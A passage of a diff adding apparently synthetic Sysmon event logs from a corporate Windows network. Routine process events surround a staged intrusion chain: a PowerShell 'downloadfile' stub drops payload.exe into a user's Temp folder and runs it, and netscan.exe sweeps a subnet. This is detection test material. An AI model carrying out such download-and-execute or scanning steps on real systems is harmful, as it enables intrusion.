+    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{e5f026b7-b602-4bfc-a97c-f61742047996}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\wininit.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:23:34.0000000Z" />
+    <EventRecordID>22</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS10</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:23:34.000</Data>
+    <Data Name="ProcessGuid">{26ae891a-aaa6-48a0-9734-aa8755ce88db}</Data>
+    <Data Name="ProcessId">10022</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell -c downloadfile</Data>
+    <Data Name="CurrentDirectory">C:\Users\emartin\</Data>
+    <Data Name="User">CORP\emartin</Data>
+    <Data Name="ParentProcessGuid">{69315242-2619-4bfc-ad10-8268ce8e6c0b}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>11</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:23:54.0000000Z" />
+    <EventRecordID>23</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS10</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:23:54.000</Data>
+    <Data Name="ProcessGuid">{26ae891a-aaa6-48a0-9734-aa8755ce88db}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetFilename">C:\Users\emartin\AppData\Local\Temp\payload.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:24:39.0000000Z" />
+    <EventRecordID>24</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS10</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:24:39.000</Data>
+    <Data Name="ProcessGuid">{9f4dae4b-22ee-4730-84fb-25dd9e8e15f8}</Data>
+    <Data Name="ProcessId">10024</Data>
+    <Data Name="Image">C:\Users\emartin\AppData\Local\Temp\payload.exe</Data>
+    <Data Name="CommandLine">payload.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\emartin\AppData\Local\Temp\</Data>
+    <Data Name="User">CORP\emartin</Data>
+    <Data Name="ParentProcessGuid">{0bbe12f9-162e-440f-b476-827543312f87}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:26:39.0000000Z" />
+    <EventRecordID>25</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS11</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:26:39.000</Data>
+    <Data Name="ProcessGuid">{ca929682-5643-4ad8-b8fb-39dda940eb68}</Data>
+    <Data Name="ProcessId">10025</Data>
+    <Data Name="Image">\\fileserver01\shared\tools\netscan.exe</Data>
+    <Data Name="CommandLine">netscan.exe -scan 192.168.1.0/24</Data>
+    <Data Name="CurrentDirectory">\\fileserver01\shared\tools\</Data>
+    <Data Name="User">CORP\fowen</Data>
+    <Data Name="ParentProcessGuid">{dcda2897-3821-45a0-8d35-2970acc74521}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:27:39.0000000Z" />
+    <EventRecordID>26</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS12</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:27:39.000</Data>
+    <Data Name="ProcessGuid">{05651c8b-2df9-43f1-8f7b-199cf01030f7}</Data>
+    <Data Name="ProcessId">10026</Data>
+    <Data Name="Image">D:\portable_apps\suspicious_tool.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">D:\portable_apps\</Data>
+    <Data Name="User">CORP\gtan</Data>
+    <Data Name="ParentProcessGuid">{0b1a3dfb-b129-411e-a87b-ea105ab57cd5}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:29:39.0000000Z" />
+    <EventRecordID>27</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:29:39.000</Data>
+    <Data Name="ProcessGuid">{a85a2534-254e-4387-a94b-0243fce0cee7}</Data>
+    <Data Name="ProcessId">10027</Data>
+    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\jdoe</Data>
+    <Data Name="ParentProcessGuid">{dd1b0661-ba1e-48b2-be0c-71582786dfc6}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:31:39.0000000Z" />
+    <EventRecordID>28</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS02</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:31:39.000</Data>
+    <Data Name="ProcessGuid">{26ec6c10-ea3d-4692-b974-6a66c2f3c025}</Data>
+    <Data Name="ProcessId">10028</Data>
+    <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\ksmith</Data>
+    <Data Name="ParentProcessGuid">{b3fdc95c-bd3a-4748-9659-63389c35b2f6}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:33:39.0000000Z" />
+    <EventRecordID>29</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS03</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:33:39.000</Data>
+    <Data Name="ProcessGuid">{658d8c2e-f115-4a26-aa40-b12bd0895470}</Data>
+    <Data Name="ProcessId">10029</Data>
+    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\mwilson</Data>
+    <Data Name="ParentProcessGuid">{c0e3d707-0e67-46cd-b1cf-69292966b319}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:35:39.0000000Z" />
+    <EventRecordID>30</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS03</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:35:39.000</Data>
+    <Data Name="ProcessGuid">{702f295a-0982-4f82-b79f-da2e74b46ee4}</Data>
+    <Data Name="ProcessId">10030</Data>
+    <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\mwilson</Data>
+    <Data Name="ParentProcessGuid">{05666f35-7916-48b8-9805-ad3e084892f3}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:37:39.0000000Z" />
+    <EventRecordID>31</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS04</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:37:39.000</Data>
+    <Data Name="ProcessGuid">{8ab2832e-0dbd-4220-8744-6478c0432c0a}</Data>
+    <Data Name="ProcessId">10031</Data>
+    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\tlee</Data>
+    <Data Name="ParentProcessGuid">{c0baf8ef-314a-4715-81ca-abd47b0f15ff}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:39:39.0000000Z" />
+    <EventRecordID>32</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:39:39.000</Data>
+    <Data Name="ProcessGuid">{bbdb352c-3c48-4feb-b218-e0407c43523e}</Data>
+    <Data Name="ProcessId">10032</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">SYSTEM</Data>
+    <Data Name="ParentProcessGuid">{b73da8a7-cdc7-49ae-8bcd-5899bd8fa0b1}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:41:39.0000000Z" />
+    <EventRecordID>33</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS05</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:41:39.000</Data>
+    <Data Name="ProcessGuid">{51abf073-c7b4-4399-a89a-6d387f77f7ef}</Data>
+    <Data Name="ProcessId">10033</Data>
+    <Data Name="Image">C:\Windows\System32\taskhostw.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\pgomez</Data>
+    <Data Name="ParentProcessGuid">{86fa1fa1-109d-4052-82ce-78a80797e09c}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:43:39.0000000Z" />
+    <EventRecordID>34</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS06</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:43:39.000</Data>
+    <Data Name="ProcessGuid">{39c67e26-2b5d-44df-8bba-712314e0db6b}</Data>
+    <Data Name="ProcessId">10034</Data>
+    <Data Name="Image">C:\Program Files\Mozilla Firefox\firefox.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\swhite</Data>
+    <Data Name="ParentProcessGuid">{24dd0592-cd6a-423a-afe5-4f77a5eab585}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-03T09:45:39.0000000Z" />
+    <EventRecordID>35</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS07</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-03 09:45:39.000</Data>
+    <Data Name="ProcessGuid">{567505c5-b4d9-4af9-8842-feb62daf9ce9}</Data>
+    <Data Name="ProcessId">10035</Data>
+    <Data Name="Image">C:\Windows\System32\calc.exe</Data>
+    <Data Name="CommandLine" />
+    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
+    <Data Name="User">CORP\bwong</Data>
+    <Data Name="ParentProcessGuid">{d37d8a33-c821-46b8-a7c4-fec15261160e}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
 </Events>
